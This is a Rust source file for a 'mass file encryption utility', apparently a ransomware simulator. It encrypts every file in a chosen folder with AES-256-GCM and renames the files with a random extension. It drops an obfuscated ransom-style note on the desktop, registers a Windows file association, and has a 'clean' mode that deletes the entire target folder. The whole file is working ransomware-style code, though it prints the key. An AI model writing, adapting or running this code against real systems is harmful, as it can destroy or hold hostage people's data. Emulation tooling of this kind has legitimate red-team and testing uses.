// Author: Jason Kelly
// Purpose: Mass File Encryption Utility
// Imports
// Standard Library
use std::io::{Read, Write};
use std::{env, fs::{File,rename,remove_dir_all}};
use std::path::{Path,PathBuf};
use std::thread::sleep;
use std::time::Duration;

// Home Directory
use dirs::home_dir;

// Base64 Decoding
use base64::prelude::*;

// AES Related Imports
use aes_gcm::aead::consts::U12;
use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::rand_core::RngCore;
// Generating random things
use rand::{distr::Alphanumeric,Rng};

// Walking target directory for encryption
use walkdir::WalkDir;

// AEAD Algorithm
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead,KeyInit,OsRng}};

// Writing AutoRun association to registry
#[cfg(target_os="windows")]
use winreg::{enums::*,RegKey};
#[cfg(target_os="windows")]
use windows::Win32::UI::Shell::{SHChangeNotify, SHCNE_ASSOCCHANGED, SHCNF_IDLIST};

#[derive(Debug)]
struct RuntimeConfiguration {
	run_operation:bool,
	extension:String,
	target_folder:String,
	note_required:bool,
}

// Argument Parser
fn parse_arguments(runtime_config:&mut RuntimeConfiguration,commandline_args:&Vec<String>) -> bool {
	let mut run_argument_provided:bool = false;
	let mut target_folder_argument_provided:bool = false;
	for (position,argument) in commandline_args.iter().enumerate() {
		let case_neutral_argument:String = argument.to_lowercase();
		// Run Operation
		if case_neutral_argument == "run" || case_neutral_argument == "clean" {
			run_argument_provided = true;
			if case_neutral_argument == "run" {
				runtime_config.run_operation = true;
			}
			else if case_neutral_argument == "clean" {
				runtime_config.run_operation = false;
			}
		}
		if case_neutral_argument == "-t" {
			if commandline_args.len()-1 >= position+1 {
				runtime_config.target_folder=String::from(commandline_args[position+1].as_str());
				target_folder_argument_provided=true;
			}
			else {
				println!("Please supply a value for the target directory!");
				return false;
			}
		}
		if case_neutral_argument == "-e" {
			if commandline_args.len()-1 >= position+1 {
				runtime_config.extension=String::from(commandline_args[position+1].as_str());
			}
			else {
				println!("Please supply a value for the file extension!");
				return false;
			}
		}
		if case_neutral_argument == "-r" {
			if commandline_args.len()-1 >= position+1 {
				let note:String = String::from(commandline_args[position+1].as_str());
				if note.to_lowercase() == "false" {
					runtime_config.note_required=false;
				}
				else if note.to_lowercase() == "true" {
					runtime_config.note_required=true;
				}
				else {
					println!("Please supply a true/false for the note drop!");
					return false;
				}
			}
			else {
				println!("Please supply a true/false for the note drop!");
				return false;
			}
		}
	}
	if !((run_argument_provided) && target_folder_argument_provided) {
		println!("Please review your arguments and make sure you provide all required values!");
		print_help();
		return false;
	}
	return true;
}

// Argument Validator
fn validate_arguments(runtime_config:&RuntimeConfiguration) -> bool {
	// Extension
	if !runtime_config.extension.chars().all(char::is_alphanumeric) {
		println!("Please provide a valid file extension which is all alphanumeric!");
		print_help();
		return false;
	}
	if !Path::new(runtime_config.target_folder.as_str()).exists() {
		println!("Please provide a valid file path and ensure it is writeable in the current context!");
		print_help();
		return false;
	}
	return true;
}

// Encrypt Target
fn encrypt(runtime_config:&RuntimeConfiguration, enc_file_count:&mut i32) -> bool {
	// Sleepy time
	sleep(Duration::from_secs(60));
	// Initialise our encryption key and nonce arrays to 0 values
	let mut enc_key_bytes:[u8;32] = [0u8;32];
	let mut nonce_bytes:[u8;12] = [0u8;12];
	
	// Generate our encryption key using random bytes
	OsRng.fill_bytes(&mut enc_key_bytes);
	let key = Key::<Aes256Gcm>::from_slice(&enc_key_bytes);

	// Generate our Nonce using random bytes
	OsRng.fill_bytes(&mut nonce_bytes);
	let nonce:&GenericArray<u8,U12> = Nonce::from_slice(&nonce_bytes);

	for entry in WalkDir::new(runtime_config.target_folder.as_str()).into_iter().filter_map(|e| e.ok()) {
		if !entry.file_type().is_file() {
			continue;
		}
		//println!("{}", entry.path().display());
		// Try opening the file
		let mut input_file:File;
		let input_file_result = File::options().read(true).open(entry.path());
		match input_file_result {
			Ok(input) => input_file = input,
			Err(error) => {println!("Error Opening File: {}", error); continue;},
		}

		//Try reading the file
		let mut input_file_data:Vec<u8> = Vec::new();
		match input_file.read_to_end(&mut input_file_data) {
			Ok(_input_data) => {},
			Err(e) => {println!("Failed to read file data: {}", e); continue}
		}
		// Initialise our AEAD cipher and encrypt
		let cipher:Aes256Gcm = Aes256Gcm::new(key);
		let encrypted_file_data:Vec<u8> = cipher.encrypt(nonce, input_file_data.as_ref()).expect("Encryption error encountered!");
		
		// Put Nonce at beginning (AEAD common practice)
		let mut data_to_write:Vec<u8> = Vec::new();
		data_to_write.extend_from_slice(&nonce);
		data_to_write.extend(encrypted_file_data);
		
		// Open file and overwrite everything
		let output_file_result = File::options().read(true).write(true).truncate(true).open(entry.path());
		let mut output_file:File;
		match output_file_result {
			Ok(out_file) => {output_file = out_file;},
			Err(e) => {println!("Error opening file to write encrypted data: {}",e);continue}
		}
		match output_file.write_all(&data_to_write) {
			Ok(_output) => {},
			Err(e) => {println!("Error writing encrypted data to file: {}",e);continue}
		}
		let new_file_name:String = entry.path().to_str().expect("Dont know why we cant get a string back here in new file name declaration!").to_string() + "." + &runtime_config.extension;
		let rename_result = rename(entry.path(),new_file_name);
		match rename_result {
			Ok(_o) => {*enc_file_count+=1},
			Err(e) => {println!("Error renaming file: {}",e);break}
		}
	}
	println!("\n\n\n\nEncryption Key Used: {}\nNonce Used: {}\nExtension Used: {}", hex::encode(enc_key_bytes), hex::encode(nonce_bytes), runtime_config.extension);
	if runtime_config.note_required {
		if !create_note() {
			println!("Failed to create note on the desktop!");
			return false;
		}
	}
	return true;
}

// Create Note
fn create_note() -> bool {
	let mut desktop_note_path:PathBuf;
	match home_dir(){
		Some(path) => {desktop_note_path = path}
		None => {println!("Error getting the users home directory!"); return false;}
	}
	desktop_note_path.push("Desktop");
	desktop_note_path.push("Note.txt");
	let mut note:File;
	match File::create(desktop_note_path.as_os_str()) {
		Ok(file) => {note = file}
		Err(e) => {println!("Failed to create file during prep: {}", e); return false}
	}
	let note_contents:String = String::from("WU9VUiBGSUxFUyBBUkUgTk9XIEVOQ1JZUFRFRCEgSEFWRSBGVU4gVFJZSU5HIFRPIEdFVCBUSEVNIEJBQ0sh");
	let mut decoded_note_contents:String = String::from("");
	match BASE64_STANDARD.decode(note_contents.as_bytes()) {
		Ok(decoded_bytes) => {
			match String::from_utf8(decoded_bytes) {
				Ok(decoded) => {decoded_note_contents = decoded}
				Err(e) => {println!("Failed to convert from bytes to UTF-8 string: {}",e)}
			}
		},
		Err(e) => {println!("Failed to decode Base64 string: {}",e); return false}
	}
	match note.write(decoded_note_contents.as_bytes()) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to write to file during prep: {}", e); return false}
	}
	return true;
}

// Clean up
fn clean(runtime_config:&RuntimeConfiguration) -> bool {
	// Delete target folder
	match remove_dir_all(runtime_config.target_folder.clone()) {
		Ok(_o) => {},
		Err(e) => {println!("Error cleaning up the target folder: {}", e); return false}
	}
	// Delete Autorun Association
	#[cfg(target_os="windows")]
	if !delete_autorun(runtime_config.extension.clone()){
		return false;
	}

	return true
}

// Autorun Association
// https://stackoverflow.com/a/28585998
#[cfg(target_os = "windows")]
fn write_autorun(file_extension:String, note:bool) -> bool {
	// Open HKCU Key
	let hkcu_key:RegKey = RegKey::predef(HKEY_CURRENT_USER);
	// Open SOFTWARE\\Classes Subkey
	let software_classes_key:RegKey = hkcu_key.open_subkey("SOFTWARE\\Classes").expect("Should have been able to open the HKCU\\SOFTWARE\\Classes key! Not sure what happened!");
	// Create Key from our Extension
	let extension_key:RegKey;
	match software_classes_key.create_subkey(".".to_string() + &file_extension) {
		Ok(key_disposition_tuple) => {extension_key = key_disposition_tuple.0},
		Err(e) => {println!("Error creating extension subkey in registry: {}",e); return false}
	}
	// Set Value for that key to be "MFE"
	match extension_key.set_value("", &"MFE".to_string()) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to set value of extension subkey in registry: {}", e)}
	}
	// Create MFE Key to autorun on encrypted files
	let command_key:RegKey;
	match hkcu_key.create_subkey("SOFTWARE\\Classes\\MFE\\shell\\open\\command") {
		Ok(key_disposition_tuple) => {command_key = key_disposition_tuple.0},
		Err(e) => {println!("Failed to create Shell\\open\\command subkey: {}", e); return false;}
	}
	if !note {
		match command_key.set_value("", &"C:\\Windows\\System32\\calc.exe") {
			Ok(_empty) => {},
			Err(e) => {println!("Failed to set value of Shell\\open\\command subkey: {}", e)}
		}
	}
	else {
		match command_key.set_value("", &"C:\\Windows\\System32\\notepad.exe %USERPROFILE%\\Desktop\\note.txt") {
			Ok(_empty) => {},
			Err(e) => {println!("Failed to set value of Shell\\open\\command subkey: {}", e)}
		}
	}
	unsafe {
		//https://stackoverflow.com/a/2697804
        SHChangeNotify(SHCNE_ASSOCCHANGED, // Event ID for association change
            SHCNF_IDLIST,       // Flags indicating the type of dwItem1
            None,               // Pointer to the first item (not used here)
            None,               // Pointer to the second item (not used here)
        );
	}
	return true;
}

// Delete AutoRun Association
#[cfg(target_os="windows")]
fn delete_autorun(file_extension:String) -> bool {
	// Open HKCU Key
	let hkcu_key:RegKey = RegKey::predef(HKEY_CURRENT_USER);
	match hkcu_key.delete_subkey_all("SOFTWARE\\Classes\\.".to_string() + &file_extension) {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to delete file extension registry key: {}", e); return false}
	}
	match hkcu_key.delete_subkey_all("SOFTWARE\\Classes\\MFE") {
		Ok(_empty) => {},
		Err(e) => {println!("Failed to delete MFE program subkey: {}",e); return false}
	}
	return true;
}

// Print Help Function
fn print_help() {
	println!(r#"Usage: frozencryptor.exe {{run/clean/prep}} -t {{target_folder}} {{-e extension}} {{-r true}}
	-t : Folder to use
	-e : Extension to use (optional argument)
	-r : Leave a note (optional argument)"#);
}

// Main Function
fn main() {
	let mut runtime_config:RuntimeConfiguration = RuntimeConfiguration {
		run_operation:true,
		extension: rand::rng().sample_iter(&Alphanumeric).take(5).map(char::from).collect(),
		target_folder: String::from("C:\\Windows\\Temp"),
		note_required: false
	};
	let args:Vec<String> = env::args().collect();
	//print_help();
	if !parse_arguments(&mut runtime_config, &args) {
		dbg!(runtime_config);
		return;
	}
	if !validate_arguments(&runtime_config) {
		dbg!(runtime_config);
		return;
	}
	if runtime_config.run_operation {
		let mut enc_file_count:i32 = 0;
		if !encrypt(&runtime_config,&mut enc_file_count) {
			dbg!(runtime_config);
			return;
		}
		println!("File Encrypted: {}", enc_file_count);
		#[cfg(target_os="windows")]
		if !write_autorun(runtime_config.extension.clone(), runtime_config.note_required) {
			dbg!(runtime_config);
			return;
		}
	}
	else {
		if !clean(&runtime_config) {
			dbg!(runtime_config);
			return;
		}
	}
}
